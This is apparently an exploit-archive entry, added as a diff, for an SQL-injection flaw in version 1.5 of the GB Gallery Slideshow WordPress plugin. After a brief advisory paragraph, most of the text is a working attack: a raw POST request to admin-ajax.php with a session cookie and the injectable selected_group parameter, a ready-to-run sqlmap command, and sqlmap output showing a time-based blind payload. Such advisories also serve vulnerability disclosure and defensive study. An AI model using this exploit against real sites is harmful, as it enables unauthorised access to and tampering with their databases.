@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/69181/info
+
+The GB Gallery Slideshow plugin for WordPress is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+An attacker can exploit this issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+GB Gallery Slideshow 1.5 is vulnerable; other versions may also be affected. 
+
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0-dev-5b2ded0 (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: 10.0.0.67
+Cookie: wordpress_75aacd302e2a4723897cb1d154c13f77=pippo%7C1407707530%7C5ae003a01e51c11e530c14f6149c9d07; wp-settings-time-1=1407537471; wp-settings-time-2=1406916594; wp-settings-1=editor%3Dtinymce%26libraryContent%3Dbrowse; voted_2=6; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_75aacd302e2a4723897cb1d154c13f77=pippo%7C1407707530%7C6988bc86de7b7790fca51ea294e171a1; redux_current_tab=3
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 120
+Connection: close
+
+action=gb_ajax_get_group&gb_nonce=5356513fbe&selected_group=[SQL_Injection]
+
+
+Exploit via sqlmap:
+
+sqlmap --cookie='INSERT_WORDPRESS_COOKIE_HERE' -u "http://www.example.com/wp-admin/admin-ajax.php" \
+--data="action=gb_ajax_get_group&gb_nonce=5356513fbe&selected_group=2" -p selected_group --dbms=mysql 
+
+---
+Place: POST
+Parameter: selected_group
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: action=gb_ajax_get_group&gb_nonce=5356513fbe&selected_group=2 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
